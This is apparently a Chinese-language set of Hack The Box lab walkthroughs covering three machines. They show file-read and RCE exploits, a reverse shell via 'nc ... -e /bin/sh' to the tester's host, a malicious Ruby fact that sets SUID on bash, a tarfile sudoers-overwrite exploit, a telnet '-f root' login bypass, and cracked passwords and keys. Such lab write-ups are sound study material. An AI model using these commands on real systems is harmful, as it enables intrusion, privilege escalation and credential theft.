└─$ aws s3 ls s3://internal/.ssh/ --profile htb --endpoint-url http://10.129.7.169:54321
2026-06-20 06:14:08         82 authorized_keys
2026-06-20 06:14:08        464 id_ed25519

┌──(kali㉿kali)-[~/Desktop]
└─$ cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDBg000olel66WJqmJTBC6iDit7cmjjcXJMjZUNsC9fE  

┌──(kali㉿kali)-[~/Desktop]
└─$ cat id_ed25519 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDXbFiKqc
cb8m8xww8YwvmfAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIDBg000olel66WJq
mJTBC6iDit7cmjjcXJMjZUNsC9fEAAAAoAiu1GJxjSZHNYGzUNyHybvrvKu3CB6vHtDcTh
0awpLK9SIjtF9ZorNQIY2kk0rRem4OHh9qtpu3tAn1GGRVYRw735vbBPMsAS27IJMLjgNT
+EWs4X5D/sr2G2gpPVeU84hPkwYxPMJOzNor1SQNPafOad288GSuyjUA4/e6F/TL7SNRT5
dqROPzym12Uv+8oPteKHR/US7mOVesHpSJsFA=
-----END OPENSSH PRIVATE KEY-----
```

现在的情况是有SSH私钥，但是不知道是谁的，查看了网站的一些用户名但是都没用，到现在就没思路了

对该套模板继续搜索，发现还有一个CVE-2024-46987 - Camaleon CMS Authenticated Arbitrary File Read，POC：[https://github.com/Goultarde/CVE-2024-46987]()，这是任意文件读取的漏洞，发现关键用户的信息`trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash`

```
┌──(kali㉿kali)-[~/Desktop/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb --user bza -p 111111 /etc/passwd | tail
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

再尝试能不能读取到flag，flag是在william这个用户中，除此之外没有其他信息了，现在又回到了该如何利用密钥

```
┌──(kali㉿kali)-[~/Desktop/CVE-2024-46987]
└─$ python3 CVE-2024-46987.py -u http://facts.htb --user bza -p 111111 /home/william/user.txt
b250c8e5b958147ba7dbb4eba2dff15a
```

### **ssh2john**

`ssh2john`是一个格式转换工具，专门用于将**密码保护的 SSH 私钥**转换成**John the Ripper**能够识别和破解的哈希格式

可以使用John the Ripper，但是手里的这个`id_ed25519`文件本身是有密码保护（加密过的），John the Ripper不能直接处理 SSH 私钥文件，需要先用`ssh2john` 这个工具把它转换成 John 能识别的哈希格式

先转换为hash文件

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh2john id_ed25519 > id_ed25519.hash
```

使用John和字典进行破解

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash

// 等待是漫长的
```

最后查看破解出的口令

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --show id_ed25519.hash                                     
id_ed25519:dragonballz
```

因为**SSH客户端**在连接时，会**强制检查私钥文件的权限**，所以需要修改权限，只有**所有者**能读写

```
┌──(kali㉿kali)-[~/Desktop]
└─$ chmod 600 id_ed25519
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': 
```

`sudo -l`列出当前用户被允许执行的命令发现，`facter`命令以 root 权限执行，而且不需要密码，查看facter中的内容

```
trivia@facts:/home$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter

trivia@facts:/home$ cat /usr/bin/facter
#!/usr/bin/ruby
# frozen_string_literal: true

require 'pathname'
require 'facter/framework/cli/cli_launcher'

Facter::OptionsValidator.validate(ARGV)
processed_arguments = CliLauncher.prepare_arguments(ARGV)

CliLauncher.start(processed_arguments)
```

facter目录中的第一个`.rb`文件`/path/to/dir/`将被执行

所以可以创建一个恶意脚本，并执行

```
trivia@facts:~$ cat > /tmp/exploit/exploit.rb << 'EOF'
> #!/usr/bin/env ruby
> puts "ruby file"
> system("chmod +s /bin/bash")
> EOF

// `--custom-dir=/tmp/` → 指定 facter 加载 `/tmp/` 目录下的自定义 fact（`.rb` 文件）
// `x` → 一个不存在的 fact 名称，触发 facter 加载所有自定义 fact
trivia@facts:~$ sudo /usr/bin/facter --custom-dir=/tmp/exploit/ x
ruby file
```

检查是否设置成功SUID位，如果成功，直接提权并拿到root的flag

```
trivia@facts:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash
trivia@facts:~$ /bin/bash -p
bash-5.2# cat /root/root.txt
fd3ea3d16577bdbc128f85e500f204b4
```

William answer：b250c8e5b958147ba7dbb4eba2dff15a

Root answer：fd3ea3d16577bdbc128f85e500f204b4

# 靶场：WingData(Linux)

究极折磨，垃圾服务器，在此之前从来没出过问题

nmap扫描

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.244.106
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-22 06:15 -0400
Nmap scan report for 10.129.244.106
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo '10.129.244.106 wingdata.htb' | sudo tee -a /etc/hosts
10.129.244.106 wingdata.htb
```

发现：`http://ftp.wingdata.htb/`，Wing FTP Server v7.4.3

Wing FTP Server Remote Code Execution: CVE-2025-47812，Wing FTP 服务器 v7.4.3 未经身份验证的远程代码执行

POC：[https://github.com/4m3rr0r/CVE-2025-47812-poc]()

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
└─$ echo '10.129.244.106 ftp.wingdata.htb' | sudo tee -a /etc/hosts
10.129.244.106 ftp.wingdata.htb
```

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c whoami

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami' and username: 'anonymous'                                 
[+] UID extracted: d32ba6c4369643757d025887de662072f528764d624db129b32c21fbca0cb8d6                                                               
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: d32ba6c4369643757d025887de662072f528764d624db129b32c21fbca0cb8d6            

--- Command Output ---                                                   
wingftp
----------------------

──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "ls -la"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'ls -la' and username: 'anonymous'                                 
[+] UID extracted: 881dd8370c47ecb1c70ad34b35352651f528764d624db129b32c21fbca0cb8d6                                                               
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 881dd8370c47ecb1c70ad34b35352651f528764d624db129b32c21fbca0cb8d6            

--- Command Output ---                                                   
total 26504
drwxr-x---  9 wingftp wingftp     4096 Jun 22 06:13 .
drwxr-xr-x  4 root    root        4096 Feb  9 08:19 ..
drwxr-x---  4 wingftp wingftp     4096 Jun 22 06:13 Data
-rwxr-x---  1 wingftp wingftp     4834 Jul 31  2018 License.txt
drwxr-x---  5 wingftp wingftp     4096 Jun 22 06:44 Log
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 lua
-rw-r--r--  1 wingftp wingftp        5 Jun 22 06:13 pid-wftpserver.pid
-rwxr-x---  1 wingftp wingftp     1434 Sep 13  2020 README
drwxr-x---  2 wingftp wingftp     4096 Jun 22 06:44 session
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 session_admin
-rwxr-x---  1 wingftp wingftp   115258 Mar 26  2025 version.txt
drwxr-x--- 10 wingftp wingftp    12288 Feb  9 08:19 webadmin
drwxr-x--- 13 wingftp wingftp     4096 Feb  9 08:19 webclient
-rwxr-x---  1 wingftp wingftp  4649509 Sep 14  2021 wftpconsole
-rwxr-x---  1 wingftp wingftp     3272 Nov  2  2025 wftp_default_ssh.key
-rwxr-x---  1 wingftp wingftp     1342 Nov 22  2017 wftp_default_ssl.crt
-rwxr-x---  1 wingftp wingftp     1675 Nov 22  2017 wftp_default_ssl.key
-rwxr-x---  1 wingftp wingftp 22283682 Mar 26  2025 wftpserver
```

反弹shell

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444             
listening on [any] 4444 ...
connect to [10.10.16.230] from (UNKNOWN) [10.129.244.106] 44868

// 交互shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

// 只能看到用户名，其他没有权限
wingftp@wingdata:/$ ls home
ls home
wacky

// 返回去Data/1/users有wacky的密码
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml

<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
└─$ python CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.16.230 4444 -e /bin/sh" -v
```

发现密码是**64位十六进制**，所以是SHA-256，而且windata还是默认加盐的，盐是固定的`WingFTP`，可以使用john也可以使用hashcat

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
└─$ rm -f hash.txt 
echo '$dynamic_62$32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca$WingFTP' > hash.txt
                                                                         
┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc]
└─$ john --format=dynamic_62 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc] └─$ john --format=dynamic_62 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (dynamic_62 [sha256($p.$s) 256/256 AVX2 8x]) Warning: no OpenMP support for this hash type, consider --fork=4 Press 'q' or Ctrl-C to abort, almost any other key for status !#7Blushing^*Bride5 (?) 1g 0:00:00:02 DONE (2026-06-22 07:43) 0.3891g/s 5581Kp/s 5581Kc/s 5581KC/s !JD021803..*7¡Vamos! Use the "--show --format=dynamic_62" options to display all of the cracked passwords reliably Session completed.

// 虚拟机爆显存/内存问题直接用john
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

ssh登录，拿到user的flag

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-47812-poc/keys]
└─$ ssh wacky@ftp.wingdata.htb

wacky@ftp.wingdata.htb's password: 

wacky@wingdata:~$ cat user.txt 
c028f5bcf3d171252ef3fd068d010a23
```

依旧`sudo -l`，无密码用root权限执行py脚本

```
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3
        /opt/backup_clients/restore_backup_clients.py *
```

查看脚本内容

```
wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

CVE-2025-4517，通过不安全提取方式遍历Python tar文件路径，POC：[https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git]()

```
┌──(kali㉿kali)-[~/Desktop/CVE-2025-4517-POC-HTB-WingData]
└─$ ls
CVE-2025-4517-POC.py  README.md
                                                                         
┌──(kali㉿kali)-[~/Desktop/CVE-2025-4517-POC-HTB-WingData]
└─$ python3 -m http.server 80  
```


```
wacky@wingdata:/tmp$ wget http://10.10.16.230/CVE-2025-4517-POC.py
--2026-06-22 08:25:58--  http://10.10.16.230/CVE-2025-4517-POC.py
Connecting to 10.10.16.230:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6973 (6.8K) [text/x-python]
Saving to: ‘CVE-2025-4517-POC.py’

CVE-2025-4517-POC. 100%[=============>]   6.81K  --.-KB/s    in 0.005s  

2026-06-22 08:25:59 (1.39 MB/s) - ‘CVE-2025-4517-POC.py’ saved [6973/6973]

wacky@wingdata:/tmp$ ls
CVE-2025-4517-POC.py
systemd-private-4f7161ff95364f0aa21c4ba1404b3e3e-apache2.service-3rbaSk
systemd-private-4f7161ff95364f0aa21c4ba1404b3e3e-systemd-logind.service-u4kU3e
systemd-private-4f7161ff95364f0aa21c4ba1404b3e3e-systemd-timesyncd.service-swoJdf
vmware-root
vmware-root_3368-2957585481
wacky@wingdata:/tmp$ python3 CVE-2025-4517-POC.py 

╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-4517 Tarfile Exploit                         ║
║     Privilege Escalation via Symlink + Hardlink Bypass    ║
╚═══════════════════════════════════════════════════════════╝
    
[*] Target user: wacky
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

============================================================
[+] EXPLOITATION SUCCESSFUL!
[+] User 'wacky' now has full sudo privileges
[+] Get root with: sudo /bin/bash
============================================================

[?] Spawn root shell now? (y/n): y

[*] Spawning root shell...
[*] Run: sudo /bin/bash
root@wingdata:/tmp# cat /root/root.txt
72cf7e351c06e6db4b4979cf91ff79fb
root@wingdata:/tmp# cat /home/wacky/user.txt
3013e21272bf1c881e02e47605513047
```

Wacky answer：3013e21272bf1c881e02e47605513047

Root answer：72cf7e351c06e6db4b4979cf91ff79fb

# 靶场：Orion(Linux)

## Nmap扫描&主机解析

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.16.247
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-04 07:26 -0400
Nmap scan report for 10.129.16.247
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
                                                                         
┌──(kali㉿kali)-[~/Desktop]
└─$ echo '10.129.16.247 orion.htb' | sudo tee -a /etc/hosts
```

## 目录枚举

```
┌──(venv)─(kali㉿kali)-[~/Desktop/DirAI-BzA]
└─$ gobuster dir -u http://orion.htb/ -w /usr/share/wordlists/dirb/common.txt
admin                (Status: 302) [Size: 0] [--> http://orion.htb/admin/login]  
```

## Metasploit利用

进入登陆页面，发现为Craft CMS 5.6.16，发现存在远程代码执行漏洞

```
──(venv)─(kali㉿kali)-[~/Desktop/DirAI-BzA]
└─$ msfconsole

msf > search craftcms

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/linux/http/craftcms_preauth_rce_cve_2025_32432  2025-04-14       excellent  Yes    Craft CMS Image Transform Preauth RCE (CVE-2025-32432)
   1    \_ target: PHP In-Memory                              .                .          .      .
   2    \_ target: Unix/Linux Command Shell                   .                .          .      .
   3  exploit/linux/http/craftcms_ftp_template                2024-12-19       excellent  Yes    Craft CMS Twig Template Injection RCE via FTP Templates Path
   4  exploit/linux/http/craftcms_unauth_rce_cve_2023_41892   2023-09-13       excellent  Yes    Craft CMS unauthenticated Remote Code Execution (RCE)
   5    \_ target: PHP                                        .                .          .      .
   6    \_ target: Unix Command                               .                .          .      .
   7    \_ target: Linux Dropper                              .                .          .      .


Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/http/craftcms_unauth_rce_cve_2023_41892                   
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'

msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432 
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS 10.129.16.247
RHOSTS => 10.129.16.247
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set VHOST orion.htb
VHOST => orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LHOST 10.10.16.230
LHOST => 10.10.16.230
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LPORT 4444
LPORT => 4444
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > run
```

## 交互式 shell 升级

```
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 敏感文件发现

```
www-data@orion:~/html/craft/web$ cat /home/adam/adam.txt
cat /home/adam/adam.txt
cat: /home/adam/adam.txt: Permission denied

www-data@orion:~/html/craft/web$ find / -name ".env" 2>/dev/null
find / -name ".env" 2>/dev/null
/var/www/html/craft/.env
www-data@orion:~/html/craft/web$ cat /var/www/html/craft/.env
cat /var/www/html/craft/.env
# Read about configuration, here:
# https://craftcms.com/docs/5.x/configure.html

# The application ID used to to uniquely store session and cache data, mutex locks, and more
CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff

# The environment Craft is currently running in (dev, staging, production, etc.)
CRAFT_ENVIRONMENT=dev

# General settings
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DEV_MODE=true
CRAFT_ALLOW_ADMIN_CHANGES=true
CRAFT_DISALLOW_ROBOTS=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=

PRIMARY_SITE_URL=http://orion.htb/
```

## 提取用户凭证

```
www-data@orion:~/html/craft/web$ mysql -h 127.0.0.1 -u root -p
mysql -h 127.0.0.1 -u root -p
Enter password: SuperSecureCraft123Pass!
// 之后就是数据库的操作
show databses;
use orion;
show tables;
desc users;
select username,email,password from orion.users;
// 最后拿到
| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
```

或者一步到位

```
www-data@orion:~/html/craft/web$ mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT username, email, password FROM orion.users;"
<SELECT username, email, password FROM orion.users;"
+----------+----------------+--------------------------------------------------------------+
| username | email          | password                                                     |
+----------+----------------+--------------------------------------------------------------+
| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----------+----------------+--------------------------------------------------------------+
```

## 破解hash

bcrypt 算法

```
┌──(kali㉿kali)-[~/Desktop/DirAI-BzA]
└─$ hashid '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
Analyzing '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt bcrypt_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
darkangel        (?)     
1g 0:00:00:22 DONE (2026-07-04 09:00) 0.04361g/s 29.82p/s 29.82c/s 29.82C/s gloria..010203
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

## SSH访问&拿到userflag

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh adam@orion.htb 
The authenticity of host 'orion.htb (10.129.16.247)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'orion.htb' (ED25519) to the list of known hosts.
adam@orion.htb's password: 
adam@orion:~$ cat user.txt 
0ed62a38c4a6e6b79dafc268f3b26eae
```

## CVE-2026-24061提权拿到rootflag

```
adam@orion:~$ netstat -tulnp | grep 23
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -                   
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.
```

```
adam@orion:~$ telnet 127.0.0.1 -l "-f root"
root@orion:~# ls
root.txt  snap
root@orion:~# cat root.txt 
ceba8f3e8c4bcf1c44472f6402298310
```